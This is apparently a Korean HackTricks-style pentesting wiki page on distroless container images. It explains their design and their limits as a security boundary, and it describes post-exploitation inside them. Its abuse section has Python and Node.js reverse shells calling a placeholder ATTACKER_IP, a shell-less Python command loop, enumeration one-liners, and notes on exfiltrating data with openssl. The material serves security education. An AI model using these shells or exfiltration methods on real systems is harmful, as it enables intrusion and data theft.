# Distroless 컨테이너

{{#include ../../../banners/hacktricks-training.md}}

## 개요

**distroless** 컨테이너 이미지는 **특정 애플리케이션 하나를 실행하는 데 필요한 최소한의 runtime components**만 포함하고, package manager, shell, 대규모 범용 userland utilities와 같은 일반적인 distribution tooling은 의도적으로 제거한 이미지입니다. 실제로 distroless 이미지는 애플리케이션 binary 또는 runtime, shared libraries, certificate bundles, 매우 작은 filesystem layout만 포함하는 경우가 많습니다.

핵심은 distroless가 새로운 kernel isolation primitive라는 의미가 아니라는 점입니다. Distroless는 **image design strategy**입니다. 이는 kernel이 컨테이너를 격리하는 방식을 바꾸는 것이 아니라, 컨테이너 filesystem **내부에서 사용 가능한 항목**을 변경합니다. 이 구분은 중요합니다. Distroless는 주로 공격자가 code execution을 획득한 이후 사용할 수 있는 것을 줄여 환경을 harden합니다. 하지만 namespaces, seccomp, capabilities, AppArmor, SELinux 또는 다른 runtime isolation mechanism을 대체하지는 않습니다.

## Distroless가 존재하는 이유

Distroless 이미지는 주로 다음 항목을 줄이기 위해 사용됩니다.

- image size
- image의 operational complexity
- vulnerabilities를 포함할 수 있는 packages와 binaries의 수
- 기본적으로 공격자가 사용할 수 있는 post-exploitation tools의 수

이 때문에 distroless 이미지는 production application deployment에서 인기가 있습니다. shell, package manager, 거의 모든 범용 tooling이 없는 컨테이너는 일반적으로 운영 측면에서 파악하기 쉽고, compromise 이후 interactive하게 악용하기도 더 어렵습니다.

잘 알려진 distroless-style image family의 예시는 다음과 같습니다.

- Google's distroless images
- Chainguard hardened/minimal images

## Distroless가 의미하지 않는 것

Distroless 컨테이너는 다음과 **같지 않습니다**.

- 자동으로 rootless인 것
- 자동으로 non-privileged인 것
- 자동으로 read-only인 것
- 자동으로 seccomp, AppArmor 또는 SELinux로 보호되는 것
- 자동으로 container escape로부터 안전한 것

여전히 `--privileged`, host namespace sharing, 위험한 bind mounts 또는 mounted runtime socket과 함께 distroless 이미지를 실행할 수 있습니다. 이러한 상황에서는 이미지가 minimal하더라도 컨테이너는 여전히 치명적으로 안전하지 않을 수 있습니다. Distroless는 **userland attack surface**를 변경할 뿐, **kernel trust boundary**를 변경하지는 않습니다.

## 일반적인 운영 특성

distroless 컨테이너를 compromise하면 가장 먼저 일반적인 가정이 더 이상 성립하지 않는다는 점을 알게 됩니다. `sh`, `bash`, `ls`, `id`, `cat`이 없을 수 있으며, 때로는 평소 tradecraft가 예상하는 방식으로 동작하는 libc-based environment조차 없을 수 있습니다. 이러한 tooling의 부재는 debugging, incident response, post-exploitation을 다르게 만들기 때문에 offense와 defense 모두에 영향을 줍니다.

가장 일반적인 패턴은 다음과 같습니다.

- application runtime은 존재하지만 그 외에는 거의 아무것도 없음
- shell이 없기 때문에 shell-based payload가 실패함
- helper binaries가 없기 때문에 일반적인 enumeration one-liner가 실패함
- read-only rootfs 또는 writable tmpfs location의 `noexec`와 같은 file system protections도 함께 적용되어 있는 경우가 많음

이 조합 때문에 보통 "weaponizing distroless"라는 표현이 사용됩니다.

## Distroless와 Post-Exploitation

distroless environment에서 주요 offensive challenge는 항상 초기 RCE인 것은 아닙니다. 그 다음 단계가 문제인 경우가 많습니다. Python, Node.js, Java 또는 Go와 같은 language runtime에서 exploited workload가 code execution을 제공한다면 arbitrary logic을 실행할 수는 있지만, 다른 Linux target에서 일반적인 shell-centric workflow를 사용할 수는 없을 수 있습니다.

따라서 post-exploitation은 대개 다음 세 방향 중 하나로 전환됩니다.

1. **이미 존재하는 language runtime을 직접 사용**하여 environment를 enumerate하고, sockets를 열고, files를 읽거나, 추가 payload를 stage합니다.
2. filesystem이 read-only이거나 writable location이 `noexec`로 mount되어 있다면 **자체 tooling을 memory로 가져옵니다**.
3. application 또는 그 dependencies에 예상치 못하게 유용한 항목이 포함되어 있다면 **이미 image에 존재하는 binaries를 abuse합니다**.

## Abuse

### 이미 존재하는 Runtime 열거

많은 distroless 컨테이너에는 shell이 없지만 application runtime은 여전히 존재합니다. target이 Python service라면 Python이 존재합니다. target이 Node.js라면 Node가 존재합니다. 이를 통해 `/bin/sh`를 전혀 호출하지 않고도 files를 enumerate하고, environment variables를 읽고, reverse shells를 열고, in-memory execution을 stage하는 데 필요한 기능을 확보할 수 있습니다.

Python을 사용한 간단한 예시는 다음과 같습니다.
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Node.js를 사용한 간단한 예:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact:

- 환경 변수 복구. 여기에는 자격 증명 또는 service endpoint가 포함되는 경우가 많음
- `/bin/ls` 없이 filesystem enumeration 수행
- 쓰기 가능한 경로와 mount된 secret 식별

### Reverse Shell Without `/bin/sh`

이미지에 `sh` 또는 `bash`가 포함되어 있지 않으면 일반적인 shell 기반 Reverse Shell이 즉시 실패할 수 있습니다. 이 경우 설치된 language runtime을 대신 사용합니다.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
`/bin/sh`가 존재하지 않는 경우, 마지막 줄을 직접 Python 기반 command execution 또는 Python REPL loop로 교체합니다.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
다시 말해, `/bin/sh`가 없으면 shell을 spawn하는 대신 Node의 filesystem, process, networking API를 직접 사용하세요.

### Full Example: No-Shell Python Command Loop

image에 Python은 있지만 shell이 전혀 없다면, 간단한 interactive loop만으로도 full post-exploitation capability를 유지할 수 있는 경우가 많습니다:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
대화형 shell binary가 필요하지 않습니다. 공격자의 관점에서 영향은 기본 shell과 사실상 동일합니다. 즉, 기존 runtime을 통한 command execution, enumeration, 추가 payload의 staging이 가능합니다.

### In-Memory Tool Execution

Distroless images는 다음과 함께 사용되는 경우가 많습니다.

- `readOnlyRootFilesystem: true`
- `/dev/shm`과 같은 writable하지만 `noexec`인 tmpfs
- package management tools의 부재

이 조합에서는 고전적인 "binary를 disk에 download한 뒤 실행" workflow가 안정적으로 동작하지 않습니다. 이러한 경우 memory execution techniques가 주요 해결책이 됩니다.

이에 대한 전용 페이지는 다음과 같습니다.

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

여기서 가장 관련성이 높은 techniques는 다음과 같습니다.

- scripting runtimes를 통한 `memfd_create` + `execve`
- DDexec / EverythingExec
- memexec
- memdlopen

### Image에 이미 존재하는 Binaries

일부 distroless images에는 compromise 이후 유용하게 사용할 수 있는, 운영상 필요한 binaries가 여전히 포함되어 있습니다. 반복적으로 관찰되는 예로 `openssl`이 있는데, applications가 crypto 또는 TLS 관련 tasks를 위해 이를 필요로 하는 경우가 있기 때문입니다.

빠르게 검색할 때 사용하는 pattern은 다음과 같습니다.
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
`openssl`가 존재한다면 다음 용도로 사용할 수 있습니다:

- outbound TLS connections
- 허용된 egress channel을 통한 data exfiltration
- encoded/encrypted blobs를 통한 payload data staging

정확한 abuse 방식은 실제로 무엇이 설치되어 있는지에 따라 달라지지만, 일반적인 개념은 distroless가 "도구가 전혀 없음"을 의미하는 것이 아니라 "일반적인 distribution image보다 훨씬 적은 도구"를 의미한다는 것입니다.

## 점검

이러한 점검의 목적은 해당 image가 실제 환경에서 정말 distroless인지, 그리고 post-exploitation에 여전히 사용할 수 있는 runtime 또는 helper binaries가 무엇인지 확인하는 것입니다.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
여기서 흥미로운 점:

- shell이 존재하지 않지만 Python이나 Node와 같은 runtime이 있다면, post-exploitation은 runtime 기반 실행으로 전환해야 합니다.
- root filesystem이 read-only이고 `/dev/shm`은 writable이지만 `noexec`인 경우, memory execution 기법이 훨씬 더 중요해집니다.
- `openssl`, `busybox`, `java`와 같은 helper binary가 존재한다면, 추가 access를 위한 bootstrap에 필요한 충분한 기능을 제공할 수 있습니다.

## Runtime 기본값

| Image / platform 스타일 | 기본 상태 | 일반적인 동작 | 일반적인 수동 약화 |
| --- | --- | --- | --- |
| Google distroless 스타일 image | 설계상 최소한의 userland | shell과 package manager가 없으며, application/runtime dependencies만 존재 | debugging layer, sidecar shell을 추가하거나 busybox 또는 tooling을 복사 |
| Chainguard minimal image | 설계상 최소한의 userland | package surface가 축소되어 있으며, 주로 하나의 runtime 또는 service에 집중 | `:latest-dev` 또는 debug variant 사용, build 중 tool 복사 |
| distroless image를 사용하는 Kubernetes workload | Pod config에 따라 다름 | distroless는 userland에만 영향을 주며, Pod security posture는 여전히 Pod spec과 runtime 기본값에 따라 결정됨 | ephemeral debug container, host mount, privileged Pod 설정 추가 |
| distroless image를 실행하는 Docker / Podman | run flag에 따라 다름 | filesystem은 최소화되지만, runtime security는 여전히 flag와 daemon configuration에 따라 결정됨 | `--privileged`, host namespace sharing, runtime socket mount, writable host bind |

핵심은 distroless가 **image property**이지 runtime protection이 아니라는 점입니다. distroless의 가치는 compromise 이후 filesystem 내부에서 사용할 수 있는 요소를 줄이는 데서 비롯됩니다.

## 관련 페이지

distroless environment에서 일반적으로 필요한 filesystem 및 memory-execution bypass:

{{#ref}}
../../linux-basics/bypass-linux-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

distroless workload에도 여전히 적용되는 container runtime, socket 및 mount abuse:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
